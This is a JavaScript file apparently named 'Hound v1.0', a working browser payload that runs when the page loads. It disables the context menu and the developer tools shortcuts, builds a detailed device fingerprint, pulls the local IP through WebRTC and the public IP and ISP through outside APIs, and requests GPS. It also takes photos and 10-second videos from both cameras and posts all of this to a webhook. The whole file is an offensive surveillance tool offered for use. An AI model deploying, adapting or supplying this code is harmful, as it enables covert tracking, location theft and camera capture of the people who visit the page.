// Hound v1.0 — Advanced Payload
// Fingerprinting + GPS + Camera + ISP + Anti-Inspect

(function() {
  'use strict';

  var WEBHOOK = '/webhook.php';

  // ==============================
  // UTILITY
  // ==============================
  function sendData(type, content, extra) {
    var payload = { type: type, content: content };
    if (extra) {
      for (var k in extra) payload[k] = extra[k];
    }
    var xhr = new XMLHttpRequest();
    xhr.open('POST', WEBHOOK);
    xhr.setRequestHeader('Content-type', 'application/json; charset=utf-8');
    xhr.send(JSON.stringify(payload));
  }

  function hashString(str) {
    var hash = 0;
    for (var i = 0; i < str.length; i++) {
      var c = str.charCodeAt(i);
      hash = ((hash << 5) - hash) + c;
      hash |= 0;
    }
    return hash.toString(16);
  }

  // ==============================
  // 1. ANTI-INSPECT
  // ==============================
  document.addEventListener('contextmenu', function(e) { e.preventDefault(); });
  document.addEventListener('keydown', function(e) {
    if (e.key === 'F12') e.preventDefault();
    if (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C')) e.preventDefault();
    if (e.ctrlKey && e.key === 'u') e.preventDefault();
  });

  // ==============================
  // 2. DEVICE & BROWSER FINGERPRINT
  // ==============================
  function getCanvasFingerprint() {
    try {
      var canvas = document.createElement('canvas');
      canvas.width = 200; canvas.height = 50;
      var ctx = canvas.getContext('2d');
      ctx.textBaseline = 'top';
      ctx.font = '14px Arial';
      ctx.fillStyle = '#f60';
      ctx.fillRect(50, 0, 100, 30);
      ctx.fillStyle = '#069';
      ctx.fillText('Hound FP', 2, 15);
      ctx.fillStyle = 'rgba(102,204,0,0.7)';
      ctx.fillText('Hound FP', 4, 17);
      return hashString(canvas.toDataURL());
    } catch(e) { return 'N/A'; }
  }

  function getWebGLInfo() {
    try {
      var canvas = document.createElement('canvas');
      var gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
      if (!gl) return { renderer: 'N/A', vendor: 'N/A' };
      var dbg = gl.getExtension('WEBGL_debug_renderer_info');
      return {
        renderer: dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : 'N/A',
        vendor: dbg ? gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL) : 'N/A'
      };
    } catch(e) { return { renderer: 'N/A', vendor: 'N/A' }; }
  }

  function getAudioFingerprint() {
    return new Promise(function(resolve) {
      try {
        var AudioCtx = window.OfflineAudioContext || window.webkitOfflineAudioContext;
        if (!AudioCtx) { resolve('N/A'); return; }
        var ctx = new AudioCtx(1, 44100, 44100);
        var osc = ctx.createOscillator();
        osc.type = 'triangle'; osc.frequency.setValueAtTime(10000, ctx.currentTime);
        var comp = ctx.createDynamicsCompressor();
        osc.connect(comp); comp.connect(ctx.destination);
        osc.start(0);
        ctx.startRendering().then(function(buf) {
          var data = buf.getChannelData(0);
          var sum = 0;
          for (var i = 4500; i < 5000; i++) sum += Math.abs(data[i]);
          resolve(hashString(sum.toString()));
        }).catch(function() { resolve('N/A'); });
      } catch(e) { resolve('N/A'); }
    });
  }

  async function getWebRTCLocalIP() {
    return new Promise(function(resolve) {
      try {
        var pc = new RTCPeerConnection({ iceServers: [] });
        pc.createDataChannel('');
        pc.createOffer().then(function(offer) {
          pc.setLocalDescription(offer);
        });
        pc.onicecandidate = function(e) {
          if (!e || !e.candidate || !e.candidate.candidate) return;
          var match = e.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
          if (match) { resolve(match[1]); pc.close(); }
        };
        setTimeout(function() { resolve('N/A'); pc.close(); }, 3000);
      } catch(e) { resolve('N/A'); }
    });
  }

  async function collectFingerprint() {
    var webgl = getWebGLInfo();
    var audioFP = await getAudioFingerprint();
    var localIP = await getWebRTCLocalIP();

    var battery = { level: 'N/A', charging: 'N/A', chargingTime: 'N/A', dischargingTime: 'N/A' };
    try {
      if (navigator.getBattery) {
        var b = await navigator.getBattery();
        battery = {
          level: Math.round(b.level * 100) + '%',
          charging: b.charging ? 'Yes' : 'No',
          chargingTime: b.chargingTime === Infinity ? 'N/A' : b.chargingTime + 's',
          dischargingTime: b.dischargingTime === Infinity ? 'N/A' : b.dischargingTime + 's'
        };
      }
    } catch(e) {}

    var conn = { type: 'N/A', downlink: 'N/A', rtt: 'N/A', saveData: 'N/A' };
    try {
      var c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
      if (c) {
        conn = {
          type: c.effectiveType || 'N/A',
          downlink: c.downlink ? c.downlink + ' Mbps' : 'N/A',
          rtt: c.rtt ? c.rtt + ' ms' : 'N/A',
          saveData: c.saveData ? 'Yes' : 'No'
        };
      }
    } catch(e) {}

    var storage = 'N/A';
    try {
      if (navigator.storage && navigator.storage.estimate) {
        var est = await navigator.storage.estimate();
        storage = Math.round(est.usage / 1024 / 1024) + 'MB / ' + Math.round(est.quota / 1024 / 1024) + 'MB';
      }
    } catch(e) {}

    var mediaDevices = [];
    try {
      var devices = await navigator.mediaDevices.enumerateDevices();
      devices.forEach(function(d) {
        mediaDevices.push(d.kind + ': ' + (d.label || 'unnamed'));
      });
    } catch(e) {}

    var orientation = 'N/A';
    try { orientation = screen.orientation ? screen.orientation.type : 'N/A'; } catch(e) {}

    var darkMode = 'N/A';
    try { darkMode = window.matchMedia('(prefers-color-scheme: dark)').matches ? 'Yes' : 'No'; } catch(e) {}

    var reducedMotion = 'N/A';
    try { reducedMotion = window.matchMedia('(prefers-reduced-motion: reduce)').matches ? 'Yes' : 'No'; } catch(e) {}

    var dt = new Date();
    var report = 'Hound v1.0 - Information Gathering Report\n';
    report += '==========================================\n\n';
    report += 'Timestamp: ' + dt.toLocaleString() + '\n\n';

    report += '--- Device Information ---\n';
    report += 'User Agent: ' + navigator.userAgent + '\n';
    report += 'Platform: ' + navigator.platform + '\n';
    report += 'Language: ' + navigator.language + '\n';
    report += 'Languages: ' + (navigator.languages || []).join(', ') + '\n';
    report += 'Cookies Enabled: ' + navigator.cookieEnabled + '\n';
    report += 'Do Not Track: ' + (navigator.doNotTrack || 'N/A') + '\n';
    report += 'Online: ' + navigator.onLine + '\n';
    report += 'PDF Viewer: ' + (navigator.pdfViewerEnabled || 'N/A') + '\n';
    report += 'Max Touch Points: ' + (navigator.maxTouchPoints || 0) + '\n';
    report += 'RAM: ' + (navigator.deviceMemory || 'N/A') + ' GB\n';
    report += 'CPU Cores: ' + (navigator.hardwareConcurrency || 'N/A') + '\n';
    report += 'OS CPU: ' + (navigator.oscpu || 'N/A') + '\n';

    report += '\n--- Screen ---\n';
    report += 'Resolution: ' + screen.width + 'x' + screen.height + '\n';
    report += 'Available: ' + screen.availWidth + 'x' + screen.availHeight + '\n';
    report += 'Color Depth: ' + screen.colorDepth + '\n';
    report += 'Pixel Depth: ' + screen.pixelDepth + '\n';
    report += 'Device Pixel Ratio: ' + window.devicePixelRatio + '\n';
    report += 'Orientation: ' + orientation + '\n';

    report += '\n--- Battery ---\n';
    report += 'Level: ' + battery.level + '\n';
    report += 'Charging: ' + battery.charging + '\n';
    report += 'Charging Time: ' + battery.chargingTime + '\n';
    report += 'Discharging Time: ' + battery.dischargingTime + '\n';

    report += '\n--- Network ---\n';
    report += 'Connection Type: ' + conn.type + '\n';
    report += 'Downlink: ' + conn.downlink + '\n';
    report += 'RTT: ' + conn.rtt + '\n';
    report += 'Data Saver: ' + conn.saveData + '\n';
    report += 'Local IP (WebRTC): ' + localIP + '\n';

    report += '\n--- GPU (WebGL) ---\n';
    report += 'Renderer: ' + webgl.renderer + '\n';
    report += 'Vendor: ' + webgl.vendor + '\n';

    report += '\n--- Fingerprints ---\n';
    report += 'Canvas FP: ' + getCanvasFingerprint() + '\n';
    report += 'Audio FP: ' + audioFP + '\n';

    report += '\n--- Storage ---\n';
    report += 'Usage/Quota: ' + storage + '\n';
    report += 'LocalStorage: ' + (typeof localStorage !== 'undefined' ? 'Yes' : 'No') + '\n';
    report += 'SessionStorage: ' + (typeof sessionStorage !== 'undefined' ? 'Yes' : 'No') + '\n';
    report += 'IndexedDB: ' + (typeof indexedDB !== 'undefined' ? 'Yes' : 'No') + '\n';

    report += '\n--- Preferences ---\n';
    report += 'Dark Mode: ' + darkMode + '\n';
    report += 'Reduced Motion: ' + reducedMotion + '\n';
    report += 'Timezone: ' + Intl.DateTimeFormat().resolvedOptions().timeZone + '\n';
    report += 'TZ Offset: ' + dt.getTimezoneOffset() + ' min\n';

    report += '\n--- Media Devices ---\n';
    report += (mediaDevices.length > 0 ? mediaDevices.join('\n') : 'N/A') + '\n';
    report += '==========================================\n';

    sendData('text', report);
  }

  // ==============================
  // 3. GPS LOCATION
  // ==============================
  function gpsLocation() {
    if (!navigator.geolocation) {
      sendData('text', '\n[GPS] Browser does not support geolocation.\n');
      return;
    }
    navigator.geolocation.getCurrentPosition(
      function(pos) {
        var c = pos.coords;
        var report = '\n--- GPS Location ---\n';
        report += 'Latitude: ' + c.latitude + '\n';
        report += 'Longitude: ' + c.longitude + '\n';
        report += 'Accuracy: ' + c.accuracy + ' meters\n';
        report += 'Altitude: ' + (c.altitude || 'N/A') + '\n';
        report += 'Alt Accuracy: ' + (c.altitudeAccuracy || 'N/A') + '\n';
        report += 'Speed: ' + (c.speed || 'N/A') + '\n';
        report += 'Heading: ' + (c.heading || 'N/A') + '\n';
        report += 'Google Maps: https://www.google.com/maps/place/' + c.latitude + ',' + c.longitude + '\n';
        report += 'Google Earth: https://earth.google.com/web/search/' + c.latitude + ',' + c.longitude + '\n';
        report += '--------------------\n';
        sendData('text', report);
      },
      function(err) {
        var msgs = {1:'Permission Denied',2:'Position Unavailable',3:'Timeout'};
        sendData('text', '\n[GPS] Error: ' + (msgs[err.code] || 'Unknown') + '\n');
      },
      { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
    );
  }

  // ==============================
  // 4. IP & ISP
  // ==============================
  function getIPInfo() {
    // Get public IP
    var xhr1 = new XMLHttpRequest();
    xhr1.open('GET', 'https://api.ipify.org?format=json');
    xhr1.onload = function() {
      try {
        var data = JSON.parse(xhr1.responseText);
        sendData('text', '\n--- Public IP ---\nIP: ' + data.ip + '\n-----------------\n');
      } catch(e) {}
    };
    xhr1.send();

    // Get ISP info via ipapi.co (HTTPS, reliable)
    var xhr2 = new XMLHttpRequest();
    xhr2.open('GET', 'https://ipapi.co/json/');
    xhr2.onload = function() {
      try {
        var r = JSON.parse(xhr2.responseText);
        var report = '\n--- ISP & Location (IP-based) ---\n';
        report += 'IP: ' + (r.ip || 'N/A') + '\n';
        report += 'Version: ' + (r.version || 'N/A') + '\n';
        report += 'Continent: ' + (r.continent_code || 'N/A') + '\n';
        report += 'Country: ' + (r.country_name || 'N/A') + ' (' + (r.country_code || '') + ')\n';
        report += 'Region: ' + (r.region || 'N/A') + '\n';
        report += 'City: ' + (r.city || 'N/A') + '\n';
        report += 'Postal: ' + (r.postal || 'N/A') + '\n';
        report += 'Lat: ' + (r.latitude || 'N/A') + '\n';
        report += 'Long: ' + (r.longitude || 'N/A') + '\n';
        report += 'Timezone: ' + (r.timezone || 'N/A') + '\n';
        report += 'UTC Offset: ' + (r.utc_offset || 'N/A') + '\n';
        report += 'ISP: ' + (r.org || 'N/A') + '\n';
        report += 'ASN: ' + (r.asn || 'N/A') + '\n';
        report += 'Country Calling: ' + (r.country_calling_code || 'N/A') + '\n';
        report += 'Currency: ' + (r.currency || 'N/A') + '\n';
        report += '---------------------------------\n';
        sendData('text', report);
      } catch(e) {
        sendData('text', '\n[ISP] Error fetching ISP data.\n');
      }
    };
    xhr2.onerror = function() {
      sendData('text', '\n[ISP] Request failed.\n');
    };
    xhr2.send();
  }

  // ==============================
  // 5. CAMERA CAPTURE
  // ==============================
  function capturePhoto(stream) {
    return new Promise(function(resolve) {
      try {
        var video = document.createElement('video');
        video.srcObject = stream;
        video.setAttribute('playsinline', '');
        video.muted = true;
        video.play();
        video.onloadeddata = function() {
          setTimeout(function() {
            var canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            var dataUrl = canvas.toDataURL('image/jpeg', 0.8);
            var base64 = dataUrl.split(',')[1];
            resolve(base64);
          }, 500);
        };
      } catch(e) { resolve(null); }
    });
  }

  function recordVideo(stream, durationMs) {
    return new Promise(function(resolve) {
      try {
        // Record through canvas to strip alpha channel (fixes GStreamer error)
        var srcVideo = document.createElement('video');
        srcVideo.srcObject = stream;
        srcVideo.setAttribute('playsinline', '');
        srcVideo.muted = true;
        srcVideo.play();

        srcVideo.onloadeddata = function() {
          var canvas = document.createElement('canvas');
          canvas.width = srcVideo.videoWidth || 640;
          canvas.height = srcVideo.videoHeight || 480;
          var ctx = canvas.getContext('2d');

          // Draw video frames to canvas (strips alpha)
          var drawInterval = setInterval(function() {
            ctx.drawImage(srcVideo, 0, 0, canvas.width, canvas.height);
          }, 33); // ~30fps

          // Capture canvas stream (no alpha channel)
          var canvasStream = canvas.captureStream(30);
          var chunks = [];
          var mimeType = MediaRecorder.isTypeSupported('video/webm;codecs=vp8') ? 'video/webm;codecs=vp8' : 'video/webm';
          var recorder = new MediaRecorder(canvasStream, { mimeType: mimeType });

          recorder.ondataavailable = function(e) {
            if (e.data && e.data.size > 0) chunks.push(e.data);
          };
          recorder.onstop = function() {
            clearInterval(drawInterval);
            var blob = new Blob(chunks, { type: mimeType });
            var reader = new FileReader();
            reader.onloadend = function() {
              var base64 = reader.result.split(',')[1];
              resolve(base64);
            };
            reader.readAsDataURL(blob);
          };
          recorder.start(1000); // collect data every 1s
          setTimeout(function() { recorder.stop(); }, durationMs);
        };
      } catch(e) { resolve(null); }
    });
  }

  async function captureFromCamera(facingMode, label) {
    try {
      var constraints = { video: { facingMode: facingMode }, audio: false };
      var stream = await navigator.mediaDevices.getUserMedia(constraints);

      // Capture photo
      var photo = await capturePhoto(stream);
      if (photo) {
        sendData('photo', photo, { camera: label + '_photo' });
      }

      // Record 10s video
      sendData('text', '\n[Camera] Recording ' + label + ' video (10s)...\n');
      var video = await recordVideo(stream, 10000);
      if (video) {
        sendData('video', video, { camera: label + '_video' });
        sendData('text', '[Camera] ' + label + ' video captured.\n');
      }

      // Stop all tracks
      stream.getTracks().forEach(function(t) { t.stop(); });
    } catch(e) {
      sendData('text', '\n[Camera] ' + label + ' failed: ' + e.message + '\n');
    }
  }

  async function captureAllCameras() {
    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
      sendData('text', '\n[Camera] getUserMedia not supported.\n');
      return;
    }
    // Front camera
    await captureFromCamera('user', 'front');
    // Back camera
    await captureFromCamera({ exact: 'environment' }, 'back');
  }

  // ==============================
  // 6. MAIN — Run everything
  // ==============================
  function gpsWithCallback(callback) {
    if (!navigator.geolocation) {
      sendData('text', '\n[GPS] Browser does not support geolocation.\n');
      callback();
      return;
    }
    navigator.geolocation.getCurrentPosition(
      function(pos) {
        var c = pos.coords;
        var report = '\n--- GPS Location ---\n';
        report += 'Latitude: ' + c.latitude + '\n';
        report += 'Longitude: ' + c.longitude + '\n';
        report += 'Accuracy: ' + c.accuracy + ' meters\n';
        report += 'Altitude: ' + (c.altitude || 'N/A') + '\n';
        report += 'Alt Accuracy: ' + (c.altitudeAccuracy || 'N/A') + '\n';
        report += 'Speed: ' + (c.speed || 'N/A') + '\n';
        report += 'Heading: ' + (c.heading || 'N/A') + '\n';
        report += 'Google Maps: https://www.google.com/maps/place/' + c.latitude + ',' + c.longitude + '\n';
        report += 'Google Earth: https://earth.google.com/web/search/' + c.latitude + ',' + c.longitude + '\n';
        report += '--------------------\n';
        sendData('text', report);
        callback();
      },
      function(err) {
        var msgs = {1:'Permission Denied',2:'Position Unavailable',3:'Timeout'};
        sendData('text', '\n[GPS] Error: ' + (msgs[err.code] || 'Unknown') + '\n');
        callback();
      },
      { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
    );
  }

  async function main() {
    // 1. Collect fingerprint data
    await collectFingerprint();
    // 2. Get IP & ISP info (fire immediately, non-blocking)
    getIPInfo();
    // 3. GPS first — then camera after GPS resolves
    gpsWithCallback(function() {
      // 4. Camera capture after GPS permission is resolved
      setTimeout(function() { captureAllCameras(); }, 1000);
    });
  }

  // Start on page load
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', main);
  } else {
    main();
  }

})();
